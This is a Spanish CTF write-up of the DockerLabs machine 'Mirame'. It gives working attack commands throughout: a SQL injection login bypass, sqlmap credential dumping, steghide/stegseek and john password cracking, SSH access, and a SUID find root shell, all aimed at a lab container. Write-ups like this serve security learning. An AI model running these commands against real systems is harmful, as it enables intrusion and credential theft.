# Mirame - Writeup

## 📋 Información General

- **Plataforma**: DockerLabs
- **Dificultad**: Easy
- **Categorías**:  Web Exploitation | SQL Injection | Cracking | Steganography | Privilege Escalation
- **Fecha**: 20/02/2026
- **Tiempo empleado**: ~30 minutos
- **Autor**: Samuel Rodriguez aka Testarious

## 🔍 Reconocimiento y Enumeración

### Escaneo de Puertos
```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
nmap -sCV -p22,80 172.17.0.2
```

**Resultados:**
![Nmap](./content/screenshots/mirame/nmap.png)

Como vemos en el escaneo de puertos, el puerto 80 está abierto, por lo que accedemos a la web (http://172.17.0.2). Nos encontramos con una página web con un panel de login.

## 💻 Explotación

### SQL Injection

![Login](./content/screenshots/mirame/login.png)

Probamos a intentar iniciar sesión con credenciales comunes como `admin:admin` entre otras, pero no tenemos éxito. Así que intentamos un SQL Injection en el campo de usuario con el payload `' OR 1=1 --` y nos muestra un error de base de datos, lo que indica que es vulnerable a SQL Injection.

![SQL Injection](./content/screenshots/mirame/sqlerror.png)

Ahora probamos con el payload `' OR 1=1 --` tanto en el campo de usuario como en el de contraseña y nos accedemos a la página `/page.php`.

![SQL Injection](./content/screenshots/mirame/consulta.png)

Tras explorarla un poco vemos que aquí no hay nada relevante, así que volvemos al panel de login y utilizando la herramienta `sqlmap` intentamos extraer información de la base de datos. Para ello interceptamos la petición con `Burp Suite` y la exportamos a un archivo `.txt` para pasarselo a `sqlmap`.

![Burp Suite](./content/screenshots/mirame/burpsuite.png)

Ahora con la herramienta `sqlmap` vamos a ir enumerando las bases de datos, tablas y columnas para obtener información.

```bash
sqlmap -r request.txt --batch --dbs

#Output:
available databases [2]:
[*] information_schema
[*] users
```

```bash
sqlmap -r request.txt --batch -D users --tables

#Output:
Database: users
[1 table]
+----------+
| usuarios |
+----------+
```

```bash
sqlmap -r request.txt --batch -D users -T usuarios --columns

#Output:
Database: users
Table: usuarios
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(11)      |
| password | varchar(255) |
| username | varchar(50)  |
+----------+--------------+
```

```bash
sqlmap -r request.txt --batch -D users -T usuarios --dump  

#Output:
Database: users
Table: usuarios
[4 entries]
+----+------------------------+------------+
| id | password               | username   |
+----+------------------------+------------+
| 1  | chocolateadministrador | admin      |
| 2  | lucas                  | lucas      |
| 3  | soyagustin123          | agustin    |
| 4  | directoriotravieso     | directorio |
+----+------------------------+------------+
```

### Esteganografía

Viendo estas credenciales nos llama la atención la contraseña del usuario `directorio` que es `directoriotravieso`, así que probamos a acceder a ese directorio via web.

![](./content/screenshots/mirame/directoriotravieso.png)

Y descubrimos que hay una imagen llamada `miramebien.jpg`.

![](./content/screenshots/mirame/miramebien.png)

Aquí se nos sugiere que miremos bien la imagen (el nombre nos da la pista), así que procedemos a analizarla con herramientas de esteganografía.

```
# La esteganografía es la técnica y ciencia de ocultar información (mensajes, archivos, datos)
dentro de otro medio aparente inofensivo —imágenes, audio, video o texto— para que solo el 
receptor previsto conozca su existencia.
```

Utilizamos la herramienta `steghide` para extraer información oculta en la imagen pero nos pide una contraseña.

```bash
steghide extract -sf miramebien.jpg
```

![](./content/screenshots/mirame/steghide.png)

Así que procedemos a intentar crackear la contraseña con `stegseek`.

```bash
stegseek miramebien.jpg /usr/share/wordlists/rockyou.txt
```

![](./content/screenshots/mirame/stegseek.png)

Obtenemos la contraseña `chocolate` así que ahora podemos extraer el contenido de la imagen con `steghide`.

```bash
steghide extract -sf miramebien.jpg
#Passphrase: chocolate
```

Nos da un archivo `ocultito.zip` y al intentar descomprimirlo nos pide una contraseña (que no es ninguna de las anteriores). Así que procedemos a intentar crackearla con `zip2john` y `john`.

```bash
zip2john ocultito.zip > ocultito.hash
john ocultito.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![](./content/screenshots/mirame/john.png)

Y obtenemos la contraseña `stupid1`. Con el que podemos descomprimir el archivo `ocultito.zip` el cual nos proporciona un archivo `secret.txt` con lo que parece ser unas credenciales. Así que procedemos a intentar usarlas para conectarnos via SSH.

```bash
#secret.txt
carlos:carlitos

ssh carlos@172.17.0.2
# Password: carlitos
```

![](./content/screenshots/mirame/ssh.png)

Tenemos acceso como `carlos` en la máquina víctima.

## 🔐 Escalada de Privilegios


Una vez logueado como el usuario `carlos`, procedemos a enumerar el sistema y buscamos binarios con permisos de ejecución especiales (SUID).

```bash
find / -perm -4000 2>/dev/null
```

Encontramos varios binarios con permisos SUID. Entre ellos nos llama la atención el binario `/usr/bin/find`. Utilizamos el recurso web `gtfobins.org` para encontrar una forma de escalar privilegios. Y nos proporciona el siguiente comando:

```bash
find . -exec /bin/sh -p \; -quit
```

![](./content/screenshots/mirame/root.png)

¡Y finalmente somos root en la máquina víctima!

## 🛠️ Herramientas Utilizadas

| Herramienta | Versión | Uso específico |
|-------------|---------|----------------|
| nmap | 7.98 | Escaneo de puertos y servicios |
| burpsuite | -- | Interceptación de tráfico HTTP |
| sqlmap | 1.10 | Escaneo de vulnerabilidades SQL |
| steghide | 0.5.1 | Extracción de archivos ocultos |
| stegseek | 0.6 | Crackeo de contraseñas en archivos ocultos |
| zip2john | -- | Generación de hash para crackeo de archivos zip |
| john | 1.9.0-jumbo-1 | Crackeo de contraseñas |
| gtfobins | -- | Escalada de privilegios |

## 🏆 Conclusión

Este CTF me ha resultado bastante entretenido y me ha permitido conocer nuevas herramientas como `steghide`, `stegseek`, `zip2john` y `john`, permitiéndome practicar técnicas de esteganografía y crackeo de contraseñas. También cabe destacar el uso de `sqlmap` para explotar vulnerabilidades SQL Injection. Y por último, mejorar mis habilidades en la escalada de privilegios y el uso de herramientas como `gtfobins`. Seguimos! 🚀